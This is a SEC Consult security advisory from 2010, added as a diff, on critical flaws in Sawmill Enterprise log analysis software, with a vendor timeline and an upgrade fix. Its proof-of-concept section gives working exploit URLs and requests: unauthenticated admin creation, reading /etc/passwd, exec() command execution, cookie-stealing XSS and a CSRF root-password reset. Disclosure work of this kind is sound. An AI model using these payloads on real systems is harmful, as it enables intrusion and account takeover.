@@ -1,0 +1,231 @@
+SEC Consult Security Advisory < 20101021-0 >
+=======================================================================
+              title: Multiple critical vulnerabilities
+            product: Sawmill - Universal Log File Analysis
+ vulnerable version: Sawmill Enterprise < v8.1.7.3
+      fixed version: v8.1.7.3
+             impact: critical
+           homepage: http://www.sawmill.net
+              found: 2010-07-20
+                 by: J. Greil / SEC Consult / www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"Sawmill is universal log analysis software that runs on every major
+platform. It can process almost any type of log data. The reports that
+Sawmill generates are hierarchical, attractive, and heavily
+cross-linked for easy navigation. Complete documentation is built
+directly into the program."
+
+source:
+http://www.sawmill.net/features.html
+
+
+Vulnerability overview/description:
+-----------------------------------
+Sawmill suffers from multiple critical vulnerabilities which allow an
+_unauthenticated_ attacker to gain administrative rights. Furthermore
+it is possible to access (RW) the file system and execute arbitrary
+commands on the operating system without authentication.
+
+Attackers with valid accounts are able to reset the root password or
+add/delete log profiles, view and manipulate admin settings etc.
+
+It must be noted that further vulnerabilities are to be expected 
+within the software (such as buffer overflows, etc.). Due to lack of 
+time no further vulnerabilities could be searched.
+
+
+1) Unauthenticated access to critical functions
+Unauthenticated attackers are e.g. able to create new user accounts 
+with administrative "Manager" roles. It is possible to exploit the 
+built-in "salang" scripting language to read/write files on the file 
+system (e.g. user configuration with MD5 hashes), connect to other 
+internal systems or execute arbitrary operating system commands.
+
+
+2) Insufficient validation of user access rights
+Users with standard access rights/roles (e.g. "Statistics Visitor") are
+able to access functions or methods of the Sawmill application where
+they shouldn't have access to (default permissions of installation).
+
+"Statistics visitor" users are able to access administrative functions
+or admin menus in order to gain sensitive information or even manipulate
+settings, create new profiles or delete profiles. The creation of new
+profiles also results in a denial-of-service (temporarily until admin
+deletes profiles) if more profiles are being created than the license
+currently allows.
+
+It is possible to access the Sawmill setup page in order to reset the
+Sawmill root username and password with a standard user account.
+
+A standard user is also able to gain access to more functions within
+the interface (e.g. regarding profiles) just by changing local
+JavaScript variables, e.g. through an intercepting proxy server.
+
+
+3) XSS / CSRF
+There are many parameters which are not properly sanitised and
+vulnerable to XSS. Furthermore no protection against CSRF is in place 
+which e.g. allows remote attackers to reset the root password by 
+e.g. exploiting the vulnerabilities in section 1 or 2.
+
+
+Proof of concept:
+-----------------
+1) Unauthenticated access to critical functions
+
+* Create a user account with admin rights:
+http://$host/?a=cu&u=testing&pw=testing&roles=role_1
+
+* Read files of the file system:
+http://$host/?a=ee&exp=error(read_file('/etc/passwd'))
+http://$host/?a=ee&exp=error(read_file('LogAnalysisInfo/users.cfg'))
+
+(error() call is needed to print the output within the web interface
+instead of stdout)
+
+* Write files:
+E.g. use the write_file() method
+
+* Execute OS commands:
+http://$host/?a=ee&exp=exec('/bin/ls','Output',1))
+(exec() only returns PID and no output. I'll leave it to the
+creativity of the reader to further exploit this :))
+
+
+2) Insufficient validation of user access rights
+
+* Access to the "new profile wizard" including file browser as standard
+  "Statistics viewer" user:
+  This feature also allows to choose arbitrary files as log analysis
+  input and to disclose its contents then (file disclosure):
+  
+http://$host/?dp+templates.new_profile_wizard.index
+
+* Access the Sawmill setup page to reset Sawmill root password:
+http://$host/?dp=templates.setup
+
+* Gain sensitive information, such as config/user settings:
+http://$host/?dp=templates.admin_pages.users.get_data&v.fp.is_root_admin=true&v.fp.is_unlimited_grants=true
+
+http://$host/?dp=templates.admin_pages.root_admin.get_data
+[... see file system for further pages ...]
+
+* Manipulate/create/delete user accounts:
+  POST /?dp+templates.admin_pages.users.save_data 
+  Host: $host
+
+  v.fp.is_enterprise=true
+  &v.fp.deleted_users=
+  &v.fp.users.user_1.is_new=false
+  &v.fp.users.user_1.username=xxxxx
+  &v.fp.users.user_1.password=
+  &v.fp.users.user_1.language=
+  &v.fp.users.user_1.created_by_user=root_admin
+  &v.fp.users.user_1.access.0.all_profiles=false
+  &v.fp.users.user_1.access.0.created_by_user=root_admin
+  &v.fp.users.user_1.access.0.profiles=testprofile
+  &v.fp.users.user_1.access.0.roles.0=role_2
+  &v.fp.users.user_1.auto_direct_to_reports_after_login=false
+  &v.fp.users.user_1.report_filters.all_profiles.filter_expression=
+  [...]
+
+* Changing local variables:
+By changing the local JS variables "isrootAdmin", "isAdd", "isDelete",
+etc. from "false" to "true" an attacker is able to unlock "hidden"
+features and e.g. is able to manipulate other profiles on the index page
+(other profiles can be deleted!).
+
+
+3) XSS (valid session necessary, payload will be auto-executed after
+login)
+http://$host/?dp=reports&p=testprofile&wbsi=";alert(document.cookie);//
+http://$host/?dp=reports&p=testprofile&rii=";alert(123);//&wbsi=1279796468489657
+
+Unauthenticated XSS:
+http://$host/?dp=printer_friendly_report&%253cscript%253ealert%281%29%253c/script%253e=1
+
+CSRF to reset root account to chosen password (valid standard user
+session necessary):
+http://$host/?dp=templates.setup&volatile.fp.setup_directive=finish&volatile.fp.license_key=&volatile.fp.username=root&volatile.fp.password=test&volatile.fp.trial_licensing_features=&volatile.fp.talkback=false&volatile.is_server_background_call=true
+
+
+Vulnerable / tested versions:
+-----------------------------
+Sawmill Enterprise v8.1.5.1 (running on Linux)
+
+Older versions may be vulnerable too, but have not been tested as
+v8.1.5.1 is the latest version available at the time of testing
+(July 2010).
+
+During the time of fixing, v8.1.6.3 has been tested shortly and the
+most critical flaws have not yet been fixed in this version.
+
+Furthermore, some pre-release builds after v8.1.6.3 have been shortly 
+tested too.
+
+
+Vendor contact timeline:
+------------------------
+2010-07-29: Contacting Sawmill via email and asking for a security
+            contact (sales@ and support () sawmill co uk)
+2010-07-29: Quick reply of Sawmill Sales and Support team
+            Sent advisory to given contact
+2010-07-29: Again quick reply of given contact with estimated fixing
+            time (early September with next release 8.1.6)
+2010-07-30: Confirmation of vulnerabilities from vendor             
+2010-08-02: Asking for information which Sawmill versions are affected
+2010-08-12: Vendor: Fixing is in progress, version info will be 
+            collected in an internal document
+2010-09-01: Vendor: problems mostly fixed in upcoming 8.1.6 in about
+            two weeks
+2010-09-07: New release 8.1.6.3 available, does not fix critical
+            vulnerabilities
+2010-09-08: Pre-release version available, very shortly checked for fix
+            of critical vulnerabilities, 8.1.7 is scheduled, XSS still
+            possible
+2010-09-21/24: v8.1.7 will be released soon, fixes most critical bugs.
+            Short-term plan to implement URL parameter filtering
+            against XSS in future versions
+2010-10-01: Sending new advisory draft to sawmill for review
+2010-10-07: v8.1.7 still under QA
+2010-10-13: v8.1.7.3 is available: Fixes reported flaws, CSRF
+            protection will come in future releases.
+2010-10.21: Coordinated release date            
+
+Special thanks to Greg!
+
+Solution:
+---------
+Upgrade to the latest available version v8.1.7.3
+
+http://www.sawmill.co.uk/downloads.html
+
+Workaround:
+-----------
+Restrict access to the software as much as possible. Only allow trusted
+IP addresses and users in order to minimise attack surface. No other
+proper workaround is available.
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/advisories_e.html
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SEC Consult Unternehmensberatung GmbH
+
+Office Vienna
+Mooslackengasse 17
+A-1190 Vienna
+Austria
+
+Tel.: +43 / 1 / 890 30 43 - 0
+Fax.: +43 / 1 / 890 30 43 - 25
+Mail: research at sec-consult dot com
+www.sec-consult.com
+
+EOF J. Greil / @2010
